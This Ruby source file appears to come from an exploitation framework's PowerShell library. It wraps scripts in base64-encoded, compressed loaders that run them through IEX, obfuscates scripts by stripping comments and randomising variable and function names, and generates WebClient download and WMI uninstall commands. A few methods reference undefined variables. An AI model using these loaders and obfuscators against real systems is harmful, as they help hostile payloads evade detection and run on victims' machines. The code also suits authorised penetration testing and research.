# -*- coding: binary -*-

require 'zlib'
require 'rex/text'

module Rex
module Exploitation

module Powershell

  module Output

    def to_s
      code
    end

    def size
      code.size
    end

    #
    # Return code with numbered lines
    #
    def to_s_lineno
      numbered = ''
      code.split(/\r\n|\n/).each_with_index do |line,idx|
        numbered << "#{idx}: #{line}"
      end
      return numbered
    end

    #
    # Return a zlib compressed powershell code
    #
    def deflate_code(eof = nil)
      # Compress using the Deflate algorithm
      compressed_stream = ::Zlib::Deflate.deflate(code,
      ::Zlib::BEST_COMPRESSION)

      # Base64 encode the compressed file contents
      encoded_stream = Rex::Text.encode_base64(compressed_stream)

      # Build the powershell expression
      # Decode base64 encoded command and create a stream object
      psh_expression =  "$s=New-Object IO.MemoryStream(,"
      psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
      # Read & delete the first two bytes due to incompatibility with MS
      psh_expression << "$stream.ReadByte()|Out-Null;"
      psh_expression << "$stream.ReadByte()|Out-Null;"
      # Uncompress and invoke the expression (execute)
      psh_expression << "$(IEX $(New-Object IO.StreamReader("
      psh_expression << "$(New-Object IO.Compression.DeflateStream("
      psh_expression << "$s,"
      psh_expression << "[IO.Compression.CompressionMode]::Decompress)),"
      psh_expression << "[Text.Encoding]::ASCII)).ReadToEnd());"

      # If eof is set, add a marker to signify end of code output
      #if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end
      psh_expression << "echo '#{eof}';" if eof

      @code = psh_expression
    end

    #
    # Return Base64 encoded powershell code
    #
    def encode_code(eof = nil)
      @code = Rex::Text.encode_base64(Rex::Text.to_unicode(code))
    end


    #
    # Return a gzip compressed powershell code
    #
    def gzip_code(eof = nil)
      # Compress using the Deflate algorithm
      compressed_stream = Rex::Text.gzip(code)

      # Base64 encode the compressed file contents
      encoded_stream = Rex::Text.encode_base64(compressed_stream)

      # Build the powershell expression
      # Decode base64 encoded command and create a stream object
      psh_expression =  "$stream = New-Object IO.MemoryStream(,"
      psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
      # Uncompress and invoke the expression (execute)
      psh_expression << "$(Invoke-Expression $(New-Object IO.StreamReader("
      psh_expression << "$(New-Object IO.Compression.GzipStream("
      psh_expression << "$stream,"
      psh_expression << "[IO.Compression.CompressionMode]::Decompress)),"
      psh_expression << "[Text.Encoding]::ASCII)).ReadToEnd());"

      # If eof is set, add a marker to signify end of code output
      #if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end
      psh_expression << "echo '#{eof}';" if eof

      # Convert expression to unicode
      unicode_expression = Rex::Text.to_unicode(psh_expression)

      @code = psh_expression
    end

    #
    # Compresses script contents with gzip or deflate
    #
    def compress_code(eof = nil, gzip = true, in_place = true)
      code = gzip ? gzip_code(eof) : deflate_code(eof)
      @code = code if in_place
      return code
    end

    #
    # Reverse the compression process
    # Try gzip, inflate if that fails
    #
    def decompress_code
      # Decode base64 and convert to ascii
      raw = Rex::Text.decode_base64(code)
      ascii_expression = Rex::Text.to_ascii(raw)
      # Extract substring with payload
      encoded_stream = ascii_expression.scan(/FromBase64String\('(.*)'/).flatten.first
      # Decode and decompress the string
      @code = ( Rex::Text.ungzip( Rex::Text.decode_base64(encoded_stream) ) ||
        Rex::Text.zlib_inflate( Rex::Text.decode_base64(encoded_stream)) )
      return code
    end
  end

  module Parser

    #
    # Get variable names from code, removes reserved names from return
    #
    def get_var_names
      # Reserved special variables
      # Acquired with: Get-Variable | Format-Table name, value -auto
      res_vars = [
        '$$',
        '$?',
        '$^',
        '$_',
        '$args',
        '$ConfirmPreference',
        '$ConsoleFileName',
        '$DebugPreference',
        '$Env',
        '$Error',
        '$ErrorActionPreference',
        '$ErrorView',
        '$ExecutionContext',
        '$false',
        '$FormatEnumerationLimit',
        '$HOME',
        '$Host',
        '$input',
        '$LASTEXITCODE',
        '$MaximumAliasCount',
        '$MaximumDriveCount',
        '$MaximumErrorCount',
        '$MaximumFunctionCount',
        '$MaximumHistoryCount',
        '$MaximumVariableCount',
        '$MyInvocation',
        '$NestedPromptLevel',
        '$null',
        '$OutputEncoding',
        '$PID',
        '$PROFILE',
        '$ProgressPreference',
        '$PSBoundParameters',
        '$PSCulture',
        '$PSEmailServer',
        '$PSHOME',
        '$PSSessionApplicationName',
        '$PSSessionConfigurationName',
        '$PSSessionOption',
        '$PSUICulture',
        '$PSVersionTable',
        '$PWD',
        '$ReportErrorShowExceptionClass',
        '$ReportErrorShowInnerException',
        '$ReportErrorShowSource',
        '$ReportErrorShowStackTrace',
        '$ShellId',
        '$StackTrace',
        '$true',
        '$VerbosePreference',
        '$WarningPreference',
        '$WhatIfPreference'
      ].map(&:downcase)

      # return code.scan(/\$[a-zA-Z\-\_]+/).uniq.flatten - res_vars

      our_vars = code.scan(/\$[a-zA-Z\-\_]+/).uniq.flatten.map(&:strip)
      return our_vars.select {|v| !res_vars.include?(v)}
    end

    #
    # Get function names from code
    #
    def get_func_names
      return code.scan(/function\s([a-zA-Z\-\_]+)/).uniq.flatten
    end

    # Attempt to find string literals in PSH expression
    def get_string_literals
      code.scan(/@"(.*)"@|@'(.*)'@/)
    end

    #
    # Scan code and return matches with index
    #
    def scan_with_index(str,source=code)
      ::Enumerator.new do |y|
        source.scan(str) do
          y << ::Regexp.last_match
        end
      end.map{|m| [m.to_s,m.offset(0)[0]]}
    end

    #
    # Return matching backet type
    #
    def match_start(char)
      case char
      when '{'
        '}'
      when '('
        ')'
      when '['
        ']'
      when '<'
        '>'
      end
    end

    #
    # Extract block of code between inside brackets/parens
    #
    # Attempts to match the bracket at idx, handling nesting manually
    # Once the balanced matching bracket is found, all script content
    # between idx and the index of the matching bracket is returned
    #
    def block_extract(idx)
      start = code[idx]
      stop = match_start(start)
      delims = scan_with_index(/#{Regexp.escape(start)}|#{Regexp.escape(stop)}/,code[idx+1..-1])
      delims.map {|x| x[1] = x[1] + idx + 1}
      c = 1
      sidx = nil
      # Go through delims till we balance, get idx
      while not c == 0 and x = delims.shift do
        sidx = x[1]
        x[0] == stop ? c -=1 : c+=1
      end
      return code[idx..sidx]
    end

    def get_func(func_name, delete = false)
      start = code.index(func_name)
      idx = code[start..-1].index('{') + start
      func_txt = block_extract(idx)
      code.delete(ftxt) if delete
      return Function.new(func_name,func_txt)
    end
  end # Parser

  module Obfu

    #
    # Create hash of string substitutions
    #
    def sub_map_generate(strings)
      map = {}
      strings.flatten.each do |str|
        map[str] = "$#{Rex::Text.rand_text_alpha(rand(2)+2)}"
        # Ensure our variables are unique
        while not map.values.uniq == map.values
          map[str] = "$#{Rex::Text.rand_text_alpha(rand(2)+2)}"
        end
      end
      return map
    end

    #
    # Remove comments
    #
    def strip_comments
      # Multi line
      code.gsub!(/<#(.*?)#>/m,'')
      # Single line
      code.gsub!(/^\s*#(?!.*region)(.*$)/i,'')
    end

    #
    # Remove empty lines
    #
    def strip_empty_lines
      # Windows EOL
      code.gsub!(/[\r\n]+/,"\r\n")
      # UNIX EOL
      code.gsub!(/[\n]+/,"\n")
    end

    #
    # Remove whitespace
    # This can break some codes using inline .NET
    #
    def strip_whitespace
      code.gsub!(/\s+/,' ')
    end

    #
    # Identify variables and replace them
    #
    def sub_vars
      # Get list of variables, remove reserved
      vars = get_var_names
      # Create map, sub key for val
      sub_map_generate(vars).each do |var,sub|
        code.gsub!(var,sub)
      end
    end

    #
    # Identify function names and replace them
    #
    def sub_funcs
      # Find out function names, make map
      # Sub map keys for values
      sub_map_generate(get_func_names).each do |var,sub|
        code.gsub!(var,sub)
      end
    end

    #
    # Perform standard substitutions
    #
    def standard_subs(subs = %w{strip_comments strip_whitespace sub_funcs sub_vars} )
      # Save us the trouble of breaking injected .NET and such
      subs.delete('strip_whitespace') unless string_literals.empty?
      # Run selected modifiers
      subs.each do |modifier|
        self.send(modifier)
      end
      code.gsub!(/^$|^\s+$/,'')
      return code
    end

  end # Obfu

  class Param
    attr_accessor :klass, :name
    def initialize(klass,name)
      @klass = klass.strip.gsub(/\[|\]|\s/,'')
      @name = name.strip.gsub(/\s|,/,'')
    end

    def to_s
      "[#{klass}]$#{name}"
    end
  end

  class Function
    attr_accessor :code, :name, :params

    include Output
    include Parser
    include Obfu

    def initialize(name,code)
      @name = name
      @code = code
      populate_params
    end
    def to_s
      "function #{name} #{code}"
    end

    def populate_params
      @params = []
      start = code.index(/param\s+\(|param\(/im)
      return unless start
      # Get start of our block
      idx = scan_with_index('(',code[start..-1]).first.last + start
      pclause = block_extract(idx)
      # Keep lines which declare a variable of some class
      vars = pclause.split(/\n|;/).select {|e| e =~ /\]\$\w/}
      vars.map! {|v| v.split('=',2).first}.map(&:strip)
      # Ignore assignment, create params with class and variable names
      vars.map {|e| e.split('$')}.each do |klass,name|
        @params << Param.new(klass,name)
      end
    end
  end

  class Script
    attr_accessor :code
    attr_reader :functions

    include Output
    include Parser
    include Obfu
    # Pretend we are actually a string
    extend Forwardable
    # In case someone messes with String we delegate based on its instance methods
    #eval %Q|def_delegators :@code, :#{::String.instance_methods[0..(String.instance_methods.index(:class)-1)].join(', :')}|
    def_delegators :@code, :each_line, :strip, :chars, :intern, :chr, :casecmp, :ascii_only?, :<, :tr_s,
                   :!=, :capitalize!, :ljust, :to_r, :sum, :private_methods, :gsub,:dump, :match, :to_sym,
                   :enum_for, :display, :tr_s!, :freeze, :gsub, :split, :rindex, :<<, :<=>, :+, :lstrip!,
                   :encoding, :start_with?, :swapcase, :lstrip!, :encoding, :start_with?, :swapcase,
                   :each_byte, :lstrip, :codepoints, :insert, :getbyte, :swapcase!, :delete, :rjust, :>=,
                   :!, :count, :slice, :clone, :chop!, :prepend, :succ!, :upcase, :include?, :frozen?,
                   :delete!, :chop, :lines, :replace, :next, :=~, :==, :rstrip!, :%, :upcase!, :each_char,
                   :hash, :rstrip, :length, :reverse, :setbyte, :bytesize, :squeeze, :>, :center, :[],
                   :<=, :to_c, :slice!, :chomp!, :next!, :downcase, :unpack, :crypt, :partition,
                   :between?, :squeeze!, :to_s, :chomp, :bytes, :clear, :!~, :to_i, :valid_encoding?, :===,
                   :tr, :downcase!, :scan, :sub!, :each_codepoint, :reverse!, :class, :size, :empty?, :byteslice,
                   :initialize_clone, :to_str, :to_enum,:tap, :tr!, :trust, :encode!, :sub, :oct, :succ, :index,
                   :[]=, :encode, :*, :hex, :to_f, :strip!, :rpartition, :ord, :capitalize, :upto, :force_encoding,
                   :end_with?

    # def method_missing(meth, *args, &block)
    #   code.send(meth,*args,&block) || (raise NoMethodError.new, meth)
    # end

    def initialize(code)
      @code = ''
      begin
        # Open code file for reading
        fd = ::File.new(code, 'rb')
        while (line = fd.gets)
          @code << line
        end

        # Close open file
        fd.close
      rescue Errno::ENAMETOOLONG, Errno::ENOENT
        # Treat code as a... code
        @code = code.to_s.dup # in case we're eating another script
      end
      @functions = get_func_names.map {|f| get_func(f)}
    end


    ##
    # Class methods
    ##


    def self.psp_funcs(dir)
      scripts = Dir.glob(File.expand_path(dir) + '/**/*').select {|e| e =~ /ps1$|psm1$/}
      functions = scripts.map {|s| puts s; Script.new(s).functions}
      return functions.flatten
    end

    #
    # Return list of code modifier methods
    #
    def self.code_modifiers
      self.instance_methods.select {|m| m =~ /^(strip|sub)/}
    end
  end # class Script

  ##
  # Convenience methods
  ##
  
  module PshMethods

    #
    # Download file to host via PSH
    #
    def self.download(src,target=nil)
      target ||= '$pwd\\' << src.split('/').last
      return %Q^(new-object System.Net.WebClient).Downloadfile("#{src}", "#{target}")^
    end

    #
    # Uninstall app
    #
    def self.uninstall(app,fuzzy=true)
      match = fuzzy ? '-like' : '-eq'
      return %Q^$app = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name #{match} "#{app}" }; $app.Uninstall()^
    end

    #
    # Create secure string from plaintext
    #
    def self.secure_string(str)
      return %Q^ConvertTo-SecureString -string '#{str}' -AsPlainText -Force$^
    end

    #
    # Convert binary to byte array, read from file if able
    #
    def self.to_byte_array(input_data,var_name = Rex::Text.rand_text_alpha(rand(3)+3))
      code = ::File.file?(input_data) ? ::File.read(input_data) : input_data
      code = code.unpack('C*')
      psh = "[Byte[]] $#{var_name} = 0x#{code[0].to_s(16)}"
      lines = []
      1.upto(code.length-1) do |byte|
        if(byte % 10 == 0)
          lines.push "\r\n$#{var_name} += 0x#{code[byte].to_s(16)}"
        else
          lines.push ",0x#{code[byte].to_s(16)}"
        end
      end

      return psh << lines.join("") + "\r\n"
    end

    #
    # Find PID of file locker
    #
    def self.who_locked_file?(filename)
      return %Q^ Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq "#{filename}"){$processVar.Name + " PID:" + $processVar.id}}}^
    end

    #
    # Return last time of login for each user
    #
    def self.get_last_login(user)
      return %Q^ Get-QADComputer -ComputerRole DomainController | foreach { (Get-QADUser -Service $_.Name -SamAccountName "#{user}").LastLogon} | Measure-Latest^
    end
  end
end
end
end

